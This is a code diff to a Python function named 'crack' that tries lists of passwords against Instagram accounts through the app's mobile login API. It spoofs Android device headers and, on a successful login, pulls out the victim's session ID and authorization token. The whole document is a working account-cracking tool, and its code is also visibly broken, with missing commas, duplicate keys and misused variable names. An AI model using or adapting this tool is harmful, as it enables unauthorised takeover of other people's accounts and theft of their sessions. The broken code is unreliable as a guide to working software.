@@ -124,7 +124,36 @@ def crack(uid, pww, total_idz):
         for pw in pww:
             session = requests.Session()
             session.headers.update({
-            **HeadersApiLogin(),
+            'host': 'b.i.instagram.com',
+            'x-ig-app-locale': 'in_ID',
+            'x-ig-device-locale': 'in_ID',
+            'x-ig-mapped-locale': 'id_ID',
+            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+            'x-ig-bandwidth-speed-kbps': '-1.000',
+            'x-ig-bandwidth-totalbytes-b': '0',
+            'x-ig-bandwidth-totaltime-ms': '0',
+            'x-bloks-version-id': self.Blok_ID(),
+            'x-bloks-is-prism-enabled': 'false',
+            'x-bloks-is-layout-rtl': 'false',
+            'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
+            'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
+            'x-ig-android-id': 'android-4aca695260085376',
+            'x-ig-timezone-offset': str(self.timezone_offset()),
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-ig-connection-type': 'MOBILE(LTE)',
+            'x-ig-capabilities': '3brTv10=',
+            'x-ig-app-id': '3419628305025917',
+            'priority': 'u=3',
+            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
+            'accept-language': 'id-ID, en-US',
+            'x-mid': str(self.SetMid()),
+            'ig-intended-user-id': '0',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'content-length': '3146',
+            'x-fb-http-engine': 'Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True'
             'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
             'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
             'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
@@ -133,11 +162,11 @@ def crack(uid, pww, total_idz):
             'x-ig-android-id': 'android-' + self.Android_ID(users, pwb).hexdigest()[:16],
             'x-ig-family-device-id': str(uuid.uuid4()),
             'x-ig-device-id': str(uuid.uuid4())})
-            DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'","event_flow":"account_recovery","family_device_id":"'+self.session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(self.session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(self.session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(self.session.headers['x-bloks-version-id'])}
-            Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.DataRec['params']), urllib.parse.quote(self.DataRec['bk_client_context']), self.DataRec['bloks_versioning_id'])
-            response = requests.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
+            DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'","event_flow":"account_recovery","family_device_id":"'+session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(session.headers['x-bloks-version-id'])}
+            Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(DataRec['params']), urllib.parse.quote(DataRec['bk_client_context']), DataRec['bloks_versioning_id'])
+            Respons = requests.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
             if 'logged_in_user' in Respons.text.replace('\\',''):
-                cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.Respons.text.replace('\\',''))).group(1)
+                cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(Respons.text.replace('\\',''))).group(1)
                 xyz = base64.b64decode(cok.split(':')[2]).decode()
                 ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                 sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
